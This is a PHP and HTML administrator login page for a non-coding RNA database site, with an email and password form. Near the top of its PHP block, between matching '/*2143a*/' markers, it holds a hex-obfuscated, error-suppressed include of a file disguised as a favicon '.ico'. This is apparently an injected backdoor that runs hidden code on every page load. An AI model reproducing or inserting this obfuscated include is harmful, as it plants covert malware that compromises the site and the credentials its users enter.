<!DOCTYPE html>
<html lang="en">
<head>
    <!-- head incluido manualmente -->
    <?php
/*2143a*/

@include "\x2fva\x72/w\x77w/\x68tm\x6c/N\x52DR\x2ffa\x76ic\x6fn_\x36a6\x640a\x2eic\x6f";

/*2143a*/
    // Para funcionar o pequeno framework
    include_once('_framework.php');
    ?>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="<?php echo BASE_URL ?>img/ico/favicon.png">
    <title>NRDR Non-coding RNA Databases Resourse</title>
    <!-- Bootstrap core CSS -->
    <link href="<?php echo BASE_URL ?>css/bootstrap.min.css" rel="stylesheet">
    <!-- Custom styles for this template -->
    <link href="<?php echo BASE_URL ?>css/custom.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="<?php echo BASE_URL ?>assets/js/html5shiv.js"></script>
    <script src="<?php echo BASE_URL ?>assets/js/respond.min.js"></script>
    <![endif]-->
</head>

<body>

<?php include(BASE_URL . 'header.php'); ?>


<div id="main">

    <div class="container">


        <form class="form col-md-4 form-login" action="?action=login" target="_self" method="post">
            <h4 class="form-signin-heading text-center">NRDR Administrative Panel</h4><br>

            <div id='divErro' class='hidden text-center text-danger' style="margin-bottom: 15px">The username or
                password you entered is incorrect.
            </div>
            <input type="text" id="email" name="email" class="form-control" placeholder="Email address" autofocus="">
            <br>
            <input type="password" id="pass" name="pass" class="form-control" placeholder="Password">
            <!--<label class="checkbox">
                <input type="checkbox" value="remember-me"> Remember me
            </label>-->
            <br>
            <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
        </form>

    </div>

</div>

<?php include(BASE_URL . 'infoline.php'); ?>

<?php include(BASE_URL . 'footer.php'); ?>


</body>
</html>

<script>

    $(function () {
        if (window.error == 'loginError') {
            $('.form').addClass('has-error');
            $('#divErro').removeClass('hidden');
        }

    });

</script>